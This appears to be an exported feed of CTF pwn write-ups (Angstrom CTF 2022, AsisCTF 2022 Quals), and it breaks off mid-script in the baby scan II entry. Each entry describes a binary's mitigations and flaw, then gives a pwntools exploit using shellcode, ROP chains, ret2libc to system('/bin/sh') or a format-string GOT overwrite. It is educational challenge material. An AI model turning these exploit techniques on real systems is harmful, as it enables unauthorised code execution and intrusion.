<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{hav3_you_4ny_dreams_y0u&#39;d_like_to_s3ll?_cb72f5211336}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] parity [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/parity/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Check your parity.</p>
<p>nc challs.actf.co 31226</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="parity">parity</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>basically, the <code>main</code> function ask us to enter a shellcode, then it will execute this shellcode. however the shellcode must satisfy a <em>parity</em>.</p>
<p>according to the program, the last bit of each byte in the shell must equal 0 or 1 depending on the index.</p>
<p>More specifically, for nth byte in the shell code, if the n is even, this byte must be even, if the n is odd, this byte must be odd.</p>
<p>It is not possible to construct <code>syscall(&#39;/bin/sh&#39;)</code> shellcode that satisfy this parity. But we can call <code>read</code> in our shellcode and then write <code>syscall(&#39;/bin/sh&#39;)</code> shellcode using <code>read</code> function.</p>
<ol>
<li>construct a shellcode satisfy parity that calls <code>read</code>,</li>
<li>enter &#x2F;bin&#x2F;sh shellcode</li>
<li>get shell</li>
</ol>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;parity&quot;)</span><br><span class="line"># libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"># ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.R2:</span><br><span class="line">            input(&quot;Wait r2 attach&quot;)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;challs.actf.co&quot;, 31226)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">def check_parity(shellcode):</span><br><span class="line">    for index,b in enumerate(shellcode):</span><br><span class="line">        print(index,b,b &amp; 1,(index - (index &gt;&gt; 0x1f) &amp; 1) +(index &gt;&gt; 0x1f))</span><br><span class="line">        if (b &amp; 1) != (index - (index &gt;&gt; 0x1f) &amp; 1) +(index &gt;&gt; 0x1f):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">    mov rdx, 0x00011001</span><br><span class="line">    mov ebx, 0x014011f0</span><br><span class="line">    nop</span><br><span class="line">    push rbx</span><br><span class="line">    pop rax</span><br><span class="line">    xor eax, 0x01000100</span><br><span class="line">    nop</span><br><span class="line">    call rax</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shell_sh = asm(shellcode)</span><br><span class="line">with open(&quot;shelcd&quot;,&quot;wb&quot;) as f:</span><br><span class="line">    f.write(shell_sh)</span><br><span class="line">for index,b in enumerate(shell_sh):</span><br><span class="line">    print(hex(b),b&amp;1,index % 2)</span><br><span class="line">print(check_parity(shell_sh))</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;&gt; &quot;,shell_sh)</span><br><span class="line">input(&quot;get shell&quot;)</span><br><span class="line">io.send(shell_sh+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{f3els_like_wa1king_down_4_landsl1de_6d28d72fd7db}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] really obnoxious problem [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/really_obnoxious_problem/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>You know the drill.</p>
<p>nc challs.actf.co 31225</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="really_obnoxious_problem">really_obnoxious_problem</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>simple buffer overflow, <code>main</code> function use <code>gets</code>. overwrite rip to a ropchain that calls <code>sym.flag</code>. </p>
<p><code>sym.flag</code> check two parameter, so we also need set <code>rdi</code> and <code>rsi</code> to the correct value in the ropchain.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = connect(&quot;challs.actf.co&quot;,31225)</span><br><span class="line">exe = context.binary = ELF(&quot;really_obnoxious_problem&quot;)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"># pop_rsi_ret_addr = exe_rop.find_gadget([&#x27;pop rsi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">io.sendlineafter(b&quot;Name:&quot;,b&quot;bobby&quot;+b&#x27;A&#x27;*(49-5))</span><br><span class="line">io.sendlineafter(b&quot;Address:&quot;,flat(&#123;</span><br><span class="line">    0x40+0x8:[</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0x1337,</span><br><span class="line">        0x00000000004013f1, # pop rsi, pop something ret</span><br><span class="line">        exe.symbols[&quot;name&quot;],</span><br><span class="line">        0,</span><br><span class="line">        exe.sym[&quot;flag&quot;]</span><br><span class="line">    ]&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{so_swe3t_so_c0ld_so_f4ir_7167cfa2c019}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] wah [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/wah/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Baby friendly!</p>
<p>nc challs.actf.co 31224</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="wah">wah</a>, <a href="wah.c">wah.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>simple buffer overflow, overwrite rip to <code>sym.flag</code></p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = connect(&quot;challs.actf.co&quot;,31224)</span><br><span class="line">exe = context.binary = ELF(&quot;wah&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Cry: &quot;,flat(&#123;</span><br><span class="line">    0x20+0x8: exe.sym[&quot;flag&quot;]</span><br><span class="line">&#125;))</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] whereami [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/whereami/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Click on the eyes.</p>
<p>@_@</p>
<p>nc challs.actf.co 31222</p>
<p>files: <a href="whereami">whereami</a>, <a href="libc.so.6">libc.so.6</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>classic <strong>ret2libc</strong> chall, in function <code>main</code> there is a <code>gets</code> function. We can use this <code>gets</code> to construct rop chain. </p>
<p>One thing to notice is that function <code>main</code> have a counter, counter increase by 1 everytime we call <code>main</code>. if counter is larger than 0, program will exit immediately. Therefore, in the first ropchain, we also need to set counter back to 0.</p>
<p>So, we need to construct following rop chain.</p>
<p>first ropchain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(got.printf) # leak libc address</span><br><span class="line">gets(obj.counter) # set counter to 0</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>second ropchain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmte(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>then we got a shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">print(pop_rdi_ret_addr,ret_addr)</span><br><span class="line">io.sendlineafter(b&quot;you?&quot;,flat(&#123;</span><br><span class="line">    0x40+0x8: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[&quot;printf&quot;],</span><br><span class="line">        exe.plt[&quot;puts&quot;],</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.symbols[&quot;counter&quot;],</span><br><span class="line">        exe.plt[&quot;gets&quot;],</span><br><span class="line">        exe.sym[&quot;main&quot;],</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">print(io.recvuntil(b&#x27;too.\n&#x27;))</span><br><span class="line">libc_base_addr = int.from_bytes(io.recvuntil(b&#x27;\n&#x27;,drop=True),&quot;little&quot;) - libc.sym[&quot;printf&quot;]</span><br><span class="line">input(hex(libc_base_addr))</span><br><span class="line">io.sendline(flat(&#123;0:[0]&#125;))</span><br><span class="line">print(hex(libc_base_addr+libc.sym[&quot;system&quot;]))</span><br><span class="line">io.sendlineafter(b&quot;you? &quot;,flat(&#123;</span><br><span class="line">    0x40:b&quot;AAAAAAAA&quot;,</span><br><span class="line">    0x40+0x8: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        libc_base_addr+next(libc.search(b&quot;/bin/sh&quot;)),</span><br><span class="line">        libc_base_addr+libc.sym[&quot;system&quot;],</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{i&#39;d_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] whatsmyname [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/whatsmyname/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Can you guess my name?</p>
<p>nc challs.actf.co 31223</p>
<p>whatsmyname whatsmyname.c</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="whatsmyname">whatsmyname</a>, <a href="whatsmyname.c">whatsmyname.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>The program basically wanna us to enter 48 bytes <code>guess</code>, program will generate 48 bytes <code>myname</code> from <code>/dev/urandom</code>. if <code>guess</code> and <code>myname</code> is same, program will print out the flag.</p>
<p>it is not possible to guess it right. However, we can use null-terminated string bug to leak <code>myname</code>. Then we can enter the same name to get the flag.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># for buffering stuff</span><br><span class="line">input(&quot;A&quot;)</span><br><span class="line">io.sendafter(b&quot;name? &quot;,b&quot;A&quot;*45+b&quot;END&quot;)</span><br><span class="line">print(io.recvuntil(b&#x27;END&#x27;))</span><br><span class="line">name = io.recvuntil(b&quot;!\nGuess&quot;,drop=True)</span><br><span class="line">print(name,len(name))</span><br><span class="line"># for buffering stuff</span><br><span class="line">input(&quot;A&quot;)</span><br><span class="line">io.sendlineafter(b&quot;flag!\n&quot;,name+b&#x27;\x00&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Baby scan I [AsisCTF 2022 Qual]</title>
    <url>/ctf-writeup/2022/asisctfqual/pwn/baby_scan_1/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Baby scan I</p>
<p>Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!</p>
<p>nc 65.21.255.31 13370</p>
<p>files: <a href="babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz">babyscan_1</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerbility"><a href="#0x2-Vulnerbility" class="headerlink" title="0x2 Vulnerbility"></a>0x2 Vulnerbility</h1><p>The source code is given</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">  char size[16], fmt[8], *buf;</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  scanf(&quot;%15s&quot;, size);</span><br><span class="line">  if (!isdigit(*size)) &#123;</span><br><span class="line">    puts(&quot;[-] Invalid number&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  buf = (char*)alloca(atoi(size) + 1);</span><br><span class="line"></span><br><span class="line">  snprintf(fmt, sizeof(fmt), &quot;%%%ss&quot;, size);</span><br><span class="line">  scanf(fmt, buf);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see that <code>isdigit</code> only take the first character of our input. We can bypass this check using any string start with a number.</p>
<p>This function also use <code>alloca</code>, <code>alloca</code> will allocate a space on top of the current stack address. </p>
<p>Since the binary doesn&#39;t enable canary, if we can perform a buffer overflow on the code, we can control the rip and do a rop chain.</p>
<p>luckily, <code>scanf</code> give us an opportunity to do that. if we use <code>%s</code> in <code>scanf</code>, <code>scanf</code> will scan all the characters until some special character (such as <code>\n</code>, space) appear. This give us a chance to input a payload with any length and overwrite rest of the stack.</p>
<p>Finally payload is <code>1$s</code>, 1 is used for bypass the check. and the final format string will be <code>%1$ss</code>. This give us the ability to overwrite whole stack.</p>
<p>Then, we can construct a ROP chain to leak libc address and perform ret2libc attack.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"><span class="keyword">if</span> args.LOCAL:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        </span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;65.21.255.31&quot;</span>, <span class="number">13370</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">ret_addr = exe_rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">pop_rsi_r15_ret_addr = exe_rop.find_gadget([<span class="string">&#x27;pop rsi&#x27;</span>, <span class="string">&#x27;pop r15&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="string">b&quot;1$s&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;data: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>*<span class="number">8</span>: <span class="number">0x0000000000404d00</span>,</span><br><span class="line">    <span class="number">0x8</span>*<span class="number">9</span>: [</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        exe.sym[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        exe.sym[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="string">&quot;little&quot;</span>)- libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">lp(<span class="string">&quot;libc base&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="string">b&quot;1$s&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;data: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>*<span class="number">9</span>: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)),</span><br><span class="line">        libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>ASIS{06e5ff13b438f5d6626a97758fddde3e502fe3fc}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Baby scan II [AsisCTF 2022 Qual]</title>
    <url>/ctf-writeup/2022/asisctfqual/pwn/baby_scan_2/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Baby scan II</p>
<p>It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.</p>
<p>nc 65.21.255.31 33710</p>
<p>files: <a href="babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz">babyscan_2</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerbility"><a href="#0x2-Vulnerbility" class="headerlink" title="0x2 Vulnerbility"></a>0x2 Vulnerbility</h1><p>The source code is also given.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">  char size[16], fmt[8], *buf;</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  scanf(&quot;%15s&quot;, size);</span><br><span class="line">  if (!isdigit(*size)) &#123;</span><br><span class="line">    puts(&quot;[-] Invalid number&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (char*)malloc(atoi(size) + 1);</span><br><span class="line"></span><br><span class="line">  printf(&quot;data: &quot;);</span><br><span class="line">  snprintf(fmt, sizeof(fmt), &quot;%%%ss&quot;, size);</span><br><span class="line">  scanf(fmt, buf);</span><br><span class="line"></span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The code here is similar to <a href="../baby_scan_1">baby_scan_1</a>. There are two main difference between this challenge and previous one.</p>
<ol>
<li><code>alloc</code> is replaced by <code>malloc</code></li>
<li>program exit instead of ret.</li>
</ol>
<p>Since program have PIE disabled and we can control the scanf format string. We basically have a write anywhere.</p>
<p>The idea is simple: write target address into the last 8 byte of local variable <code>size</code>. use <code>%9$s</code> to scan character into that address</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===</span><br><span class="line">some stack value           &lt;== rsp</span><br><span class="line">9$s\x00\x00\x00\x00\x00    &lt;== size[16]</span><br><span class="line">target_address</span><br><span class="line">RBP</span><br><span class="line">RIP</span><br><span class="line">====</span><br></pre></td></tr></table></figure>

<p>Also, since it is partial RELRO, we can overwrite the jmp address of <code>exit</code> in GOT and make it jump back to <code>main</code> again. Now we have an infinite number of write anywhere.</p>
<p>To leak the address. We can overwrite jmp address of <code>atoi</code> with <code>printf</code>. Then, we can leak libc address on the stack using <code>%&#123;offset&#125;$p</code></p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"><span class="keyword">if</span> args.LOCAL:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;65.21.255.31&quot;</span>, <span class="number">33710</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># one_gadget = 0xe3b31</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="string">b&quot;9$s&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">5</span>+exe.got[<span class="string">&quot;exit&quot;</span>].to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;data: &quot;</span>,exe.sym[<span class="string">&quot;main&quot;</span>].to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="string">b&quot;9$s&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">5</span>+exe.got[<span class="string">&quot;atoi&quot;</span>].to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;data: &quot;</span>,exe.sym[<span class="string">&quot;printf&quot;</span>].to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size&quot;</span>,<span class="string">b&quot;1%29$p&quot;</span>)</span><br><span class="line">lp(io.recvuntil(<span class="string">b&#x27;10x&#x27;</span>))</span><br><span class="line">libc.address = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;data: &#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.libc_start_main_return</span><br><span class="line">lp(<span class="string">&quot;libc base&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line">io.sendline(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span 